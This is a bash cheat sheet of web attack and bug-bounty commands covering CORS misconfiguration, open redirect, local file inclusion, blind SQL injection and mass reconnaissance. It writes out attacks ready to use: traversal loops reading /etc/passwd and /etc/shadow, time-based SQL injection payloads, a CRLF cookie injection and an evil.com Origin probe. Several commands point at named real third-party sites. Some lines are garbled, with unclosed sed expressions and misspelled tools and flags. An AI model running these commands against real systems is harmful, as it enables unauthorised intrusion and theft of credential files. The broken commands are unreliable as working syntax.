#!/bin/bash


# ************************************
# ************ Cors Vulns ************
# ************************************
curl "https://about.fb.com/wp-json" -I   # Analyse the output
curl "https://about.fb.com/wp-json" -I -H Origin:evil.com
cat dms.txt | httpx-toolkit -silent -o out.txt
corsy -i /ss

# URLs
cat dms.txt | httpx-toolkit -sc -td --title | grep "Related Text"
shortscan https://sub1.dm.com -F 

xssstrike -u "https://link" -l 4 -t 10

# ***************************************
# ************ Open redirect ************
# ***************************************
Big_Bounty_Recon # search for doamins  
paramspider -d 
cat dms.txt | openredirex -k "FUZZ"

# ****************************************************
# ************ LFT - Local File Inclusion ************
# ****************************************************
subfinder -d www.dms.com | httpx-toolkit | gau | uro | gf lfi | tee result.txt
nuclei -list list.txt -tags lfi
nuclei -target "https://dm.com" -tags lfi
dotdotpwn -m http-url -d 10 -f /etc/passwd -u "https://dm.com?page=TRAVERSAL" -b -k "root:"

subfinder -d www.dms.com | httpx-toolkit | gau | uro | gf lfi | qsreplace "/etc/passwd" | 
while read url;do curl -silent "$url" | grep "root:X:" && echo "$url is vulnerable"; done;

paramspider -d sub.dm.com --subs
dotdotpwn -m http-url -d 10 -f /etc/passwd -u "https://dm.com?page=FUZZ=TRAVERSAL" -b -k "root:"
dotdotpwn -m http-url -d 10 -f /etc/shadow -u "https://dm.com?page=FUZZ=TRAVERSAL" -b -k "root:"


# *********************************************
# ************ Blind SQL Injection ************
# *********************************************
echo https://dm.com | gau | urldedupe -qs  | gf sqli | grep ?id


# BEST SQLI METHODLOGY BY COFFIN:
# for single url:
python3 lostsec.py -u "https://cutm.ac.in/payu/skill/index.php?id=34" -p payloads/xor.txt -t 5
# for multiple urls:
paramspider - www.speedway.net.au -o urls.txt
cat output/urls.txt
sed 's/FUZZ//g' >final.txt
python3 lostsec.py -1 final.txt -p payloads/xor.txt -t 5
echo testphp.vulnweb.com | gau-mc 200 uridedupe >urls.txt
cat urls.txt | grep - ".php.asp|.aspx|.cfm|.jsp" | grep '■' | sort > output.txt
cat output.txt | sed 's/.*/=/* >final.txt
python3 lostsec.py -1 final.txt -p payloads/xor.txt -t 5
echo testphp.vulnweb.com | katana -d 5 -ps -pss waybackarchive, commoncrawl, alienvault -f qurl | urldedupe >output.txt |
katana -u http://testphp.vulnweb.com -d 5 | grep '■' | urldedupe | anew output.txt
cat output.txt | sed 's/.*//* >final.txt
python3 lostsec.py -1 final.txt -p payloads/xor.txt -t 5

# ******************************
# ************ FUFF ************
# ******************************
echo https://d.com | waybackurls | lfi | urldedupe
ffuf -request req.txt -request-proto https -w payloads/lfi.txt -c -mr "admin:"

# ********************************
# ************ Nuclei ************
# ********************************
cat dm.txt | nuclei -t /OpenRedierct.yoml --retries 2 --dast
cat dm.txt | nuclei -t /blind-ssrf.yoml --retries 2 --dast
curl -I https://dm.com?path=///.etc/./passwd
cat dm.txt | nuclei -t /blind-ssrf.yoml --dast
curl -I ' https://www.shs.com/%0aSet-Cookie:coffin=hi;'
time curl -I ' https://www.shs.com?id=1+or+sleep(7)--+-'
time curl -I ' https://www.shs.com?id=1+or+sleep(3)--+-'
time curl -I ' https://www.shs.com?id=1+or+sleep(5)--+-'
time curl -I ' https://www.shs.com?id=1+or+sleep(0)--+-'
shortscan https://fb.com/ -F

curl -H "Origin://example.com" -I \ 
 https://etoropartners.com/wp-json/ | grep -i -e "access-control-allow-origin" -e access-control-allow-methods" 
 -e "access-control-allow-credentials"

curl -H "Origin://example.com" -I \ 
 https://etoropartners.com/wp-json/"


# ***************************************
# ************ Bug Bounty 01 ************
# ***************************************
subfinder -dL dms.txt -all -recursive -o subdms.txt
cat subdms.txt | wc -l
cat subdms.txt | httpx-toolkit -l subdms.txt -ports  80,8080,8000,8888 -threads 200 > sbdms_live.txt
cat sbdms_live.txt | wc -l
naabu -list sbdms.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt
cat naabu-full.txt | wc -l
dirsearch -l sbdms_live.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w wordlist.txt



# ***************************************
# ************ Bug Bounty 02 ************
# ***************************************



# ***************************************
# ***************************************
XLSNinja, ORScanner, SQLiScanner, XSSScanner, 